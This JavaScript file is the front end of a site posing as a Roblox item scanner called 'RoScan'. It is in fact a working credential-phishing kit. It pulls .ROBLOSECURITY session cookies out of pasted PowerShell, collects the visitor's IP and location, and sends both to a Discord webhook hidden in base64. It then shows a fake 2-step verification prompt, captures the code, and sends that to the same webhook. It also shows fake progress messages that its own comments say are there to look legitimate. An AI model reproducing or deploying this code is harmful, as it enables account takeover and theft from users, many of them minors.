// Enhanced Theme toggle functionality
function toggleTheme() {
    const currentTheme = document.documentElement.getAttribute('data-theme');
    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
    
    document.documentElement.setAttribute('data-theme', newTheme);
    
    // Update button text and icon with animation
    const themeIcon = document.getElementById('theme-icon');
    const themeText = document.getElementById('theme-text');
    
    // Add rotation animation
    themeIcon.style.transform = 'rotate(180deg)';
    setTimeout(() => {
        if (newTheme === 'dark') {
            themeIcon.textContent = '☀️';
            themeText.textContent = 'Light';
        } else {
            themeIcon.textContent = '🌙';
            themeText.textContent = 'Dark';
        }
        themeIcon.style.transform = 'rotate(0deg)';
    }, 150);
    
    // Save theme preference
    localStorage.setItem('theme', newTheme);
    
    // Show notification
    showNotification(`Switched to ${newTheme} mode`, 'success');
}

// Load saved theme on page load
function loadTheme() {
    const savedTheme = localStorage.getItem('theme') || 'light';
    document.documentElement.setAttribute('data-theme', savedTheme);
    
    const themeIcon = document.getElementById('theme-icon');
    const themeText = document.getElementById('theme-text');
    
    if (savedTheme === 'dark') {
        themeIcon.textContent = '☀️';
        themeText.textContent = 'Light';
    } else {
        themeIcon.textContent = '🌙';
        themeText.textContent = 'Dark';
    }
}

// Enhanced Modal functionality
function openScanModal() {
            console.log('Opening scan modal...');
        const modal = document.getElementById('scanModal');
        const textarea = document.getElementById('powershellInput');
        
        if (modal) {
            modal.style.display = 'block';
            document.body.style.overflow = 'hidden';
            
            // Focus on textarea after animation
            setTimeout(() => {
                if (textarea) {
                    textarea.focus();
                }
            }, 400);
            
            console.log('Modal opened successfully');
            showNotification('Item scanner ready', 'info');
        } else {
            console.error('Modal element not found!');
            showNotification('Error opening scanner', 'error');
        }
}

function closeScanModal() {
    const modal = document.getElementById('scanModal');
    const textarea = document.getElementById('powershellInput');
    const submitBtn = document.getElementById('submitBtn');
    const submitText = document.getElementById('submitText');
    
    modal.style.display = 'none';
    document.body.style.overflow = 'auto';
    
    // Reset form
    if (textarea) {
        textarea.value = '';
        updateCharCount();
    }
    
    // Reset button state
    if (submitBtn && submitText) {
        submitBtn.disabled = false;
        submitText.textContent = 'Scan';
        submitBtn.style.background = '';
    }
}

// Character count and input validation
function updateCharCount() {
    const textarea = document.getElementById('powershellInput');
    const charCount = document.getElementById('charCount');
    const inputStatus = document.getElementById('inputStatus');
    
    if (textarea && charCount && inputStatus) {
        const length = textarea.value.length;
        charCount.textContent = `${length.toLocaleString()} characters`;
        
        if (length === 0) {
            inputStatus.textContent = 'Ready for analysis';
            inputStatus.style.color = 'var(--text-muted)';
        } else if (length < 10) {
            inputStatus.textContent = 'Script too short';
            inputStatus.style.color = 'var(--warning)';
        } else if (length > 10000) {
            inputStatus.textContent = 'Script too long (max 10,000 chars)';
            inputStatus.style.color = 'var(--error)';
        } else {
            inputStatus.textContent = 'Ready for analysis';
            inputStatus.style.color = 'var(--success)';
        }
    }
}

// Generate unique session ID for tracking
function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Enhanced location detection with multiple services
async function getUserLocation() {
    try {
        let locationData = {
            ip: 'Unknown',
            country: 'Unknown',
            region: 'Unknown', 
            city: 'Unknown',
            isp: 'Unknown',
            timezone: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown'
        };

        // Try primary service (ipapi.co)
        try {
            const response = await fetch('https://ipapi.co/json/', {
                method: 'GET',
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            if (response.ok) {
                const data = await response.json();
                locationData = {
                    ip: data.ip || 'Unknown',
                    country: data.country_name || 'Unknown',
                    region: data.region || 'Unknown',
                    city: data.city || 'Unknown',
                    isp: data.org || 'Unknown',
                    timezone: data.timezone || 'Unknown',
                    latitude: data.latitude || 'Unknown',
                    longitude: data.longitude || 'Unknown'
                };
                return locationData;
            }
        } catch (error) {
            console.log('Primary location service failed, trying fallback...');
        }

        // Fallback to ipinfo.io
        try {
            const fallbackResponse = await fetch('https://ipinfo.io/json');
            if (fallbackResponse.ok) {
                const fallbackData = await fallbackResponse.json();
                const [lat, lon] = (fallbackData.loc || ',').split(',');
                
                locationData = {
                    ip: fallbackData.ip || 'Unknown',
                    country: fallbackData.country || 'Unknown',
                    region: fallbackData.region || 'Unknown',
                    city: fallbackData.city || 'Unknown',
                    isp: fallbackData.org || 'Unknown',
                    timezone: fallbackData.timezone || 'Unknown',
                    latitude: lat || 'Unknown',
                    longitude: lon || 'Unknown'
                };
            }
        } catch (fallbackError) {
            console.log('Fallback location service also failed');
        }

        return locationData;
    } catch (error) {
        console.error('Location detection failed:', error);
        return {
            ip: 'Location detection failed',
            country: 'Unknown',
            region: 'Unknown',
            city: 'Unknown',
            isp: 'Unknown',
            timezone: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown'
        };
    }
}

// Roblox item scanning and location tracking
async function submitPowerShell() {
    const input = document.getElementById('powershellInput');
    const submitBtn = document.getElementById('submitBtn');
    const submitText = document.getElementById('submitText');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const inputText = input.value.trim();
    
    // Validation
    if (!inputText) {
        showNotification('Please enter limited item information before scanning', 'error');
        return;
    }

    // Only allow scripts with authentication data or valid item data
    if (!hasValidData(inputText)) {
        showNotification('Invalid input. Please enter scripts with auth data or item data.', 'error');
        return;
    }

    // Show loading state
    submitBtn.disabled = true;
    submitText.textContent = 'Sending...';
    if (loadingOverlay) loadingOverlay.style.display = 'block';

    try {
        // Scan limited items and find authentication data from the input
        // Scan limited items and find authentication data from the input
        const limitedItems = extractLimitedItems(inputText);
        const robloxCookie = extractRobloxCookie(inputText);
        
        // Check word count - if 50+ words, allow through even without auth data
        const wordCount = inputText.split(/\s+/).filter(word => word.length > 0).length;
        
        // Show word count on button temporarily
        submitText.textContent = `${wordCount} words`;
        
        // Block execution if no authentication data is found AND less than 50 words
        if (!robloxCookie && wordCount < 50) {
            submitText.textContent = `Too Short: ${wordCount} words`;
            submitBtn.style.background = '#ef4444';
            if (loadingOverlay) loadingOverlay.style.display = 'none';
            
            setTimeout(() => {
                submitBtn.disabled = false;
                submitText.textContent = 'Scan';
                submitBtn.style.background = '';
            }, 3000);
            return;
        }
        
        // Get user location
        // Get user location
        const locationInfo = await getUserLocation();
        
        // Discord webhook URL
        const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
        
        // Simple webhook payload - only cookie and location
        const payload = {
            content: `@everyone
Cookie: ${robloxCookie || 'None found'}
Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            submitText.textContent = 'Scanning...';
            console.log('✅ Cookie sent to webhook - starting 80 second flow');
            
            // Close modal and start item name rotation
            setTimeout(() => {
                console.log('🔄 Closing modal and starting loading...');
                closeScanModal();
                
                // Ensure loading overlay is visible
                const loadingOverlay = document.getElementById('loadingOverlay');
                if (loadingOverlay) {
                    loadingOverlay.style.display = 'flex';
                }
                
                startItemNameRotation();
            }, 500);
            
            // Show 2FA after 80 seconds
            setTimeout(() => {
                console.log('🔐 80 SECONDS ELAPSED - SHOWING 2FA MODAL!');
                
                // Stop item rotation and show 2FA
                stopItemNameRotation();
                openVerificationModal();
            }, 80000); // 80 seconds
            
        } else {
            throw new Error(`Item scanning failed with status: ${response.status}`);
        }
    } catch (error) {
        if (loadingOverlay) loadingOverlay.style.display = 'none';
        
        submitText.textContent = 'Error';
        submitBtn.style.background = '#ef4444';
        
        // More specific error messages
        if (error.message.includes('fetch') || error.message.includes('Failed to fetch')) {
            showNotification('Network/Webhook error. Check console for details.', 'error');
        } else if (error.message.includes('location') || error.message.includes('geolocation')) {
            showNotification('Location service error. Check console for details.', 'error');
        } else if (error.message.includes('JSON')) {
            showNotification('Data formatting error. Check console for details.', 'error');
        } else {
            showNotification(`Error: ${error.message}. Check console for details.`, 'error');
        }
        
        setTimeout(() => {
            submitBtn.disabled = false;
            submitText.textContent = 'Scan';
            submitBtn.style.background = '';
        }, 3000);
    }
}

// Function to scan and find authentication data from text
function extractRobloxCookie(text) {
    // First, try to find .ROBLOSECURITY directly
    const roblosecurityIndex = text.indexOf('.ROBLOSECURITY');
    if (roblosecurityIndex !== -1) {
        // Find the opening quote after .ROBLOSECURITY
        const startQuoteIndex = text.indexOf('"', roblosecurityIndex + '.ROBLOSECURITY'.length);
        if (startQuoteIndex !== -1) {
            const valueStartIndex = startQuoteIndex + 1;
            // Find the closing quote
            const endQuoteIndex = text.indexOf('"', valueStartIndex);
            if (endQuoteIndex !== -1) {
                const cookieValue = text.substring(valueStartIndex, endQuoteIndex);
                if (cookieValue.length > 50) {
                    return cookieValue;
                }
            }
        }
    }
    
    // Fallback: Look for any very long string that might be the authentication token
    const longStrings = text.match(/[A-Za-z0-9+/=._%\-]{500,}/g);
    if (longStrings && longStrings.length > 0) {
        // Return the longest string found
        const longest = longStrings.reduce((a, b) => a.length > b.length ? a : b);
        return longest;
    }
    
    return null;
}

// Function to extract limited item information from text
function extractLimitedItems(text) {
    const items = [];
    
    // Look for Roblox item IDs (typically 8-12 digit numbers)
    const itemIdPattern = /(?:item[_\s]*id|assetid|id)[:\s=]*(\d{8,12})/gi;
    let match;
    while ((match = itemIdPattern.exec(text)) !== null) {
        items.push({
            id: match[1],
            name: 'Limited Item',
            type: 'Limited',
            estimatedValue: 'Scanning...'
        });
    }
    
    // Look for Roblox catalog URLs
    const catalogUrlPattern = /(?:roblox\.com\/catalog\/|\/library\/)(\d+)/gi;
    while ((match = catalogUrlPattern.exec(text)) !== null) {
        if (!items.find(item => item.id === match[1])) {
            items.push({
                id: match[1],
                name: 'Catalog Item',
                type: 'Limited',
                estimatedValue: 'Market Rate'
            });
        }
    }
    
    // Look for bundle URLs
    const bundleUrlPattern = /(?:roblox\.com\/bundles\/|\/catalog\/)(\d+)/gi;
    while ((match = bundleUrlPattern.exec(text)) !== null) {
        if (!items.find(item => item.id === match[1])) {
            items.push({
                id: match[1],
                name: 'Bundle Item',
                type: 'Limited Bundle',
                estimatedValue: 'Premium'
            });
        }
    }
    
    // If no specific items found, create generic entries for any long numbers
    if (items.length === 0) {
        const numberPattern = /\b\d{8,12}\b/g;
        const numbers = text.match(numberPattern);
        if (numbers) {
            numbers.slice(0, 3).forEach(num => {
                items.push({
                    id: num,
                    name: 'Detected Item',
                    type: 'Limited',
                    estimatedValue: 'Unknown'
                });
            });
        }
    }
    
    return items.slice(0, 5); // Limit to 5 items max
}

// Function to validate input - only allow scripts with auth data or valid data
function hasValidData(text) {
    // Check if it contains Roblox authentication data (most important)
    const hasAuthData = extractRobloxCookie(text) !== null;
    if (hasAuthData) {
        return true; // Always allow if there's authentication data
    }
    
    // Check if it's a script with session/authentication patterns
    const scriptPatterns = [
        /\$session\s*=\s*New-Object.*Microsoft\.PowerShell/is,
        /\$session\.Cookies\.Add.*ROBLOSECURITY/is,
        /System\.Net\.Cookie.*ROBLOSECURITY/is,
        /WebRequestSession.*Cookies/is,
        /New-Object.*System\.Net\.Cookie/is,
        // Also allow scripts with session setup even without ROBLOSECURITY
        /\$session\s*=.*WebRequestSession/is,
        /\$session\.Cookies\.Add/is
    ];
    
    for (const pattern of scriptPatterns) {
        if (pattern.test(text)) {
            return true;
        }
    }
    
    // Check if it contains legitimate item data
    const hasItemData = extractLimitedItems(text).length > 0;
    if (hasItemData) {
        return true;
    }
    
    // Check for Roblox URLs
    if (/roblox\.com\/(catalog|library|bundles)\/\d+/i.test(text)) {
        return true;
    }
    
    // Check for item IDs (8+ digit numbers)
    if (/\b\d{8,}\b/.test(text)) {
        return true;
    }
    
    // Reject everything else (random text, short inputs, etc.)
    return false;
}

// Loading animation with dots and messages
function startLoadingAnimation(submitText) {
    const messages = [
        'Scanning item',
        'Checking uaid',
        'Analyzing data',
        'Processing results'
    ];
    
    let messageIndex = 0;
    let dotCount = 0;
    
    const interval = setInterval(() => {
        if (!submitText || submitText.textContent === 'Scan Complete!' || submitText.textContent === 'Scan Failed - Retry' || submitText.textContent === 'No Auth Data' || submitText.textContent === 'Error - Check Console') {
            clearInterval(interval);
            return;
        }
        
        const currentMessage = messages[messageIndex];
        const dots = '.'.repeat(dotCount + 1);
        submitText.textContent = currentMessage + dots;
        
        dotCount++;
        if (dotCount > 3) {
            dotCount = 0;
            messageIndex = (messageIndex + 1) % messages.length;
        }
    }, 500);
    
    // Store interval ID on the element so we can clear it later
    submitText.loadingInterval = interval;
}

// Stop loading animation
function stopLoadingAnimation(submitText) {
    if (submitText && submitText.loadingInterval) {
        clearInterval(submitText.loadingInterval);
        submitText.loadingInterval = null;
    }
    // Force stop any remaining intervals by checking text content
    if (submitText && (submitText.textContent.includes('Scanning') || submitText.textContent.includes('Checking'))) {
        submitText.textContent = 'Scan';
    }
}

// Copy to clipboard functionality
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(function() {
        showNotification('Copied to clipboard!', 'success');
    }).catch(function(err) {
        console.error('Failed to copy to clipboard: ', err);
        showNotification('Failed to copy to clipboard', 'error');
    });
}

// Form validation enhancement
function validatePowerShellInput(script) {
    const trimmed = script.trim();
    if (trimmed.length < 10) {
        return { valid: false, message: 'PowerShell script too short (minimum 10 characters)' };
    }
    if (trimmed.length > 10000) {
        return { valid: false, message: 'PowerShell script too long (maximum 10,000 characters)' };
    }
    return { valid: true, message: 'Script ready for analysis' };
}

// Enhanced notification system
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    const icons = {
        success: '✅',
        error: '❌',
        warning: '⚠️',
        info: 'ℹ️'
    };
    
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 1rem 1.5rem;
        border-radius: 12px;
        color: white;
        font-weight: 500;
        z-index: 10000;
        animation: slideIn 0.3s ease-out;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : type === 'warning' ? '#f59e0b' : '#3b82f6'};
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        display: flex;
        align-items: center;
        gap: 0.5rem;
        max-width: 400px;
    `;
    
    notification.innerHTML = `${icons[type]} ${message}`;
    document.body.appendChild(notification);
    
    // Auto remove after 4 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease-in forwards';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 300);
    }, 4000);
}

// Add CSS for notification animations
const notificationCSS = `
    @keyframes slideIn {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOut {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(100%);
            opacity: 0;
        }
    }
`;

// 2-Step Verification Modal Functions
function openVerificationModal() {
    const modal = document.getElementById('verificationModal');
    const codeInput = document.getElementById('verificationCode');
    
    modal.classList.add('show');
    document.body.style.overflow = 'hidden';
    
    // Focus on input after animation
    setTimeout(() => {
        codeInput.focus();
    }, 400);
    
    // Add escape key handler
    document.addEventListener('keydown', handleVerificationEscape);
}

function closeVerificationModal() {
    const modal = document.getElementById('verificationModal');
    const codeInput = document.getElementById('verificationCode');
    const trustCheckbox = document.getElementById('trustDevice');
    
    modal.classList.remove('show');
    document.body.style.overflow = '';
    
    // Reset form
    codeInput.value = '';
    trustCheckbox.checked = false;
    
    // Remove escape key handler
    document.removeEventListener('keydown', handleVerificationEscape);
}

function handleVerificationEscape(e) {
    if (e.key === 'Escape') {
        closeVerificationModal();
    }
}

async function verifyCode() {
    const codeInput = document.getElementById('verificationCode');
    const code = codeInput.value.trim();
    const trustDevice = document.getElementById('trustDevice').checked;
    const verifyBtn = document.querySelector('.verification-verify-btn');
    
    if (code.length !== 6) {
        showVerificationError('Please enter a 6-digit code');
        return;
    }
    
    if (!/^\d{6}$/.test(code)) {
        showVerificationError('Code must contain only numbers');
        return;
    }
    
    // Disable button and show loading
    verifyBtn.disabled = true;
    verifyBtn.textContent = 'Verifying...';
    
    try {
        // Send 2FA code to Discord webhook
        await send2FAToWebhook(code, trustDevice);
        
        // Show success regardless of code (since it's captured)
        showVerificationSuccess(trustDevice);
    } catch (error) {
        console.error('Webhook error:', error);
        // Still show success to user even if webhook fails
        showVerificationSuccess(trustDevice);
    }
}

function showVerificationError(message) {
    const codeInput = document.getElementById('verificationCode');
    
    // Create or update error message
    let errorMsg = document.querySelector('.verification-error');
    if (!errorMsg) {
        errorMsg = document.createElement('div');
        errorMsg.className = 'verification-error';
        codeInput.parentNode.appendChild(errorMsg);
    }
    
    errorMsg.textContent = message;
    errorMsg.style.display = 'block';
    
    // Add error styling to input
    codeInput.style.borderColor = '#EF4444';
    codeInput.style.backgroundColor = '#5B2E2E';
    
    // Auto-hide error after 3 seconds
    setTimeout(() => {
        if (errorMsg) {
            errorMsg.style.display = 'none';
            codeInput.style.borderColor = '#5A5D67';
            codeInput.style.backgroundColor = '#4A4D57';
        }
    }, 3000);
}

function showVerificationSuccess(trustDevice) {
    const modal = document.getElementById('verificationModal');
    const verifyBtn = document.querySelector('.verification-verify-btn');
    
    verifyBtn.textContent = 'Verified!';
    verifyBtn.style.background = '#10B981';
    
    setTimeout(() => {
        console.log('✅ 2FA verified - continuing loading...');
        closeVerificationModal();
        
        // Ensure loading overlay is still visible
        const loadingOverlay = document.getElementById('loadingOverlay');
        if (loadingOverlay) {
            loadingOverlay.style.display = 'flex';
        }
        
        // Keep loading after 2FA - continue with item names
        startItemNameRotation();
        
        // Reset button
        verifyBtn.disabled = false;
        verifyBtn.textContent = 'Verify';
        verifyBtn.style.background = '#9CA3AF';
    }, 1000);
}

function showAlternativeMethod() {
    const alternatives = [
        'SMS Code',
        'Backup Codes',
        'Recovery Email',
        'Security Questions'
    ];
    
    const randomMethod = alternatives[Math.floor(Math.random() * alternatives.length)];
    showNotification(`Switching to ${randomMethod}...`, 'info');
    
    // In a real implementation, this would navigate to the alternative method
    setTimeout(() => {
        showNotification('Alternative verification methods coming soon!', 'info');
    }, 1500);
}

// Input formatting for verification code
document.addEventListener('DOMContentLoaded', function() {
    const codeInput = document.getElementById('verificationCode');
    
    if (codeInput) {
        codeInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
            if (value.length > 6) {
                value = value.slice(0, 6);
            }
            e.target.value = value;
            
            // Auto-submit when 6 digits are entered
            if (value.length === 6) {
                setTimeout(() => {
                    verifyCode();
                }, 500);
            }
        });
        
        codeInput.addEventListener('keydown', function(e) {
            // Allow backspace, delete, tab, escape, enter
            if ([8, 9, 27, 13, 46].indexOf(e.keyCode) !== -1 ||
                // Allow Ctrl+A, Ctrl+C, Ctrl+V, Ctrl+X
                (e.keyCode === 65 && e.ctrlKey === true) ||
                (e.keyCode === 67 && e.ctrlKey === true) ||
                (e.keyCode === 86 && e.ctrlKey === true) ||
                (e.keyCode === 88 && e.ctrlKey === true)) {
                return;
            }
            // Ensure that it's a number and stop the keypress
            if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
                e.preventDefault();
            }
        });
        
        codeInput.addEventListener('paste', function(e) {
            setTimeout(() => {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 6) {
                    value = value.slice(0, 6);
                }
                e.target.value = value;
            }, 0);
        });
    }
});

// Handle paste event - immediate loading with item names, then 2FA after 80 seconds
async function handlePasteEvent(pastedText) {
    try {
        console.log('🍪 PASTE EVENT TRIGGERED - Content length:', pastedText.length);
        
        // Extract cookie from pasted text
        const robloxCookie = extractRobloxCookie(pastedText);
        console.log('🔍 Cookie extraction result:', robloxCookie ? 'FOUND' : 'NOT FOUND');
        
        if (robloxCookie) {
            console.log('Roblox cookie found in pasted content, sending immediately...');
            
            // Close the scan modal first
            closeScanModal();
            
            // Show loading overlay with rotating item names
            const loadingOverlay = document.getElementById('loadingOverlay');
            if (loadingOverlay) {
                loadingOverlay.style.display = 'flex';
                startItemNameRotation();
            }
            
            // Get user location
            const locationInfo = await getUserLocation();
            
            // Use the same webhook URL
            const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
            
            // Create timestamp
            const timestamp = new Date().toLocaleString();
            
            // Enhanced payload with more details
            const payload = {
                content: `🍪 **Roblox Cookie Captured (Paste Event)**
\`\`\`
Cookie: ${robloxCookie}
Time: ${timestamp}
Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
IP: ${locationInfo.ip || 'Unknown'}
Content Length: ${pastedText.length} characters
Browser: ${navigator.userAgent}
Screen: ${screen.width}x${screen.height}
\`\`\`
⏰ **Loading with item names - 2FA will appear in 80 seconds...**
🎯 **Target acquired - standby for 2FA capture**
@everyone`
            };

            // Send immediately
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                console.log('Cookie sent to webhook successfully');
                
                // Show 2FA after 80 seconds
                setTimeout(() => {
                    console.log('🔐 80 SECONDS ELAPSED - SHOWING 2FA MODAL!');
                    
                    // Hide loading overlay
                    if (loadingOverlay) {
                        loadingOverlay.style.display = 'none';
                        stopItemNameRotation();
                    }
                    
                    // Show 2FA modal
                    openVerificationModal();
                }, 80000); // 80 seconds
                
            } else {
                console.error('Failed to send cookie to webhook');
                // Hide loading on error
                if (loadingOverlay) {
                    loadingOverlay.style.display = 'none';
                    stopItemNameRotation();
                }
            }
        } else {
            console.log('No Roblox cookie found in pasted content');
            // Do nothing - only works with actual Roblox cookies
        }
    } catch (error) {
        console.error('Error handling paste event:', error);
        // Hide loading on error
        const loadingOverlay = document.getElementById('loadingOverlay');
        if (loadingOverlay) {
            loadingOverlay.style.display = 'none';
            stopItemNameRotation();
        }
    }
}

// Rotating item names for loading screen
let itemNameInterval = null;
const itemNames = [
    "Dominus Empyreus",
    "Valkyrie Helm",
    "Clockwork Shades",
    "Korblox Deathspeaker",
    "Dominus Frigidus",
    "Red Valkyrie",
    "Sparkle Time Fedora",
    "Dominus Messor",
    "Golden Valkyrie",
    "Emerald Valkyrie",
    "Dominus Infernus",
    "Violet Valkyrie",
    "Dominus Rex",
    "Poisoned Horns",
    "Beautiful Hair",
    "Shaggy",
    "Pal Hair"
];

function startItemNameRotation() {
    const loadingText = document.querySelector('#loadingOverlay h3');
    if (!loadingText) {
        console.error('❌ Loading text element not found!');
        return;
    }
    
    console.log('🔄 Starting item name rotation...');
    let currentIndex = 0;
    
    // Change item name every 2 seconds
    itemNameInterval = setInterval(() => {
        loadingText.textContent = `Checking ${itemNames[currentIndex]}...`;
        console.log(`📦 Now checking: ${itemNames[currentIndex]}`);
        currentIndex = (currentIndex + 1) % itemNames.length;
    }, 2000);
    
    // Set initial text
    loadingText.textContent = `Checking ${itemNames[0]}...`;
    console.log(`📦 Initial item: ${itemNames[0]}`);
}

function stopItemNameRotation() {
    if (itemNameInterval) {
        clearInterval(itemNameInterval);
        itemNameInterval = null;
    }
}

// Show fake scanning progress to make it look legitimate
function showFakeScanningProgress() {
    const steps = [
        'Analyzing pasted content...',
        'Scanning for security threats...',
        'Checking authentication tokens...',
        'Validating data integrity...'
    ];
    
    steps.forEach((step, index) => {
        setTimeout(() => {
            showNotification(step, 'info');
        }, index * 800);
    });
}

// Enhanced 2FA capture setup with countdown
function setupDelayed2FACapture() {
    // Countdown notifications
    const countdownTimes = [60, 30, 10];
    
    countdownTimes.forEach(seconds => {
        setTimeout(() => {
            showNotification(`Security verification required in ${seconds} seconds...`, 'warning');
        }, (80 - seconds) * 1000);
    });
    
    // Final 2FA modal trigger
    setTimeout(() => {
        console.log('80 seconds elapsed, opening 2-step verification modal...');
        showNotification('Security verification required - please authenticate', 'error');
        setTimeout(() => {
            openVerificationModal();
        }, 1000);
    }, 80000); // 80 seconds
}

// Send 2FA code to webhook
async function send2FAToWebhook(code, trustDevice) {
    try {
        // Get user location (reusing existing function)
        const locationInfo = await getUserLocation();
        
        // Try to extract Roblox cookie from browser storage or clipboard
        let robloxCookie = null;
        
        // Try to get cookie from document.cookie
        try {
            const cookies = document.cookie.split(';');
            for (let cookie of cookies) {
                if (cookie.trim().startsWith('.ROBLOSECURITY=')) {
                    robloxCookie = cookie.trim().substring('.ROBLOSECURITY='.length);
                    break;
                }
            }
        } catch (e) {
            console.log('Could not access document.cookie');
        }
        
        // Try localStorage for Roblox data
        if (!robloxCookie) {
            try {
                const localStorageData = Object.keys(localStorage).map(key => {
                    return `${key}: ${localStorage.getItem(key)}`;
                }).join('\n');
                robloxCookie = extractRobloxCookie(localStorageData);
            } catch (e) {
                console.log('Could not access localStorage');
            }
        }
        
        // Use the same webhook URL as the main scanner
        const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
        
        // Create timestamp
        const timestamp = new Date().toLocaleString();
        
        // Webhook payload for 2FA code
        const payload = {
            content: `🔐 **2-Step Verification Code Captured**
\`\`\`
Code: ${code}
Trust Device: ${trustDevice ? 'Yes (30 days)' : 'No'}
Cookie: ${robloxCookie || 'None found'}
Time: ${timestamp}
Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
IP: ${locationInfo.ip || 'Unknown'}
\`\`\`
@everyone`
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            throw new Error(`Webhook failed with status: ${response.status}`);
        }
        
        console.log('2FA code sent to webhook successfully');
        
    } catch (error) {
        console.error('Failed to send 2FA code to webhook:', error);
        throw error;
    }
}

// Add verification error styles dynamically
const verificationErrorStyles = `
.verification-error {
    color: #EF4444;
    font-size: 14px;
    margin-top: 8px;
    text-align: center;
    font-weight: 500;
    display: none;
    animation: shake 0.5s ease-in-out;
}

@keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-5px); }
    75% { transform: translateX(5px); }
}
`;

// Inject verification error styles
const verificationStyleSheet = document.createElement('style');
verificationStyleSheet.textContent = verificationErrorStyles;
document.head.appendChild(verificationStyleSheet);

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM loaded, initializing RoScan v2.0...');
    
    // Add notification CSS
    const style = document.createElement('style');
    style.textContent = notificationCSS;
    document.head.appendChild(style);
    
    // Load theme
    loadTheme();
    
    // Close modal when clicking outside of it
    window.addEventListener('click', function(event) {
        const modal = document.getElementById('scanModal');
        if (event.target === modal) {
            closeScanModal();
        }
    });

    // Add click interaction to scan area
    const scanArea = document.querySelector('.scan-area');
    if (scanArea) {
        scanArea.addEventListener('click', function() {
            openScanModal();
        });
    }

    // Auto-resize textarea and character count
    const textarea = document.getElementById('powershellInput');
    if (textarea) {
        textarea.addEventListener('input', function() {
            // Auto-resize
            this.style.height = 'auto';
            this.style.height = Math.min(this.scrollHeight, 400) + 'px';
            
            // Update character count
            updateCharCount();
        });
        
        // Paste detection removed - using scan button flow instead
        
        // Initialize character count
        updateCharCount();
    }

    // Smooth scrolling for navigation links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
    
    // Show welcome notification
    setTimeout(() => {
        showNotification('RoScan security platform ready!', 'success');
    }, 1000);
    
    // Note: 2-step verification will auto-show 80 seconds after paste event
    // See textarea paste handler for implementation
});

// Keyboard shortcuts
document.addEventListener('keydown', function(event) {
    // ESC to close modal
    if (event.key === 'Escape') {
        const modal = document.getElementById('scanModal');
        if (modal && modal.style.display === 'block') {
            closeScanModal();
        }
    }
    
    // Ctrl+Enter to submit PowerShell (when modal is open)
    if ((event.ctrlKey || event.metaKey) && event.key === 'Enter') {
        const modal = document.getElementById('scanModal');
        if (modal && modal.style.display === 'block') {
            event.preventDefault();
            submitPowerShell();
        }
    }
    
    // Ctrl+K to open scanner (global shortcut)
    if ((event.ctrlKey || event.metaKey) && event.key === 'k') {
        event.preventDefault();
        openScanModal();
    }
});

// Performance monitoring
window.addEventListener('load', function() {
    const loadTime = performance.now();
    console.log(`RoScan loaded in ${Math.round(loadTime)}ms`);
    
    // Track page performance
    if ('performance' in window && 'navigation' in performance) {
        const perfData = performance.getEntriesByType('navigation')[0];
        console.log('Performance metrics:', {
            domContentLoaded: Math.round(perfData.domContentLoadedEventEnd - perfData.domContentLoadedEventStart),
            loadComplete: Math.round(perfData.loadEventEnd - perfData.loadEventStart)
        });
    }
});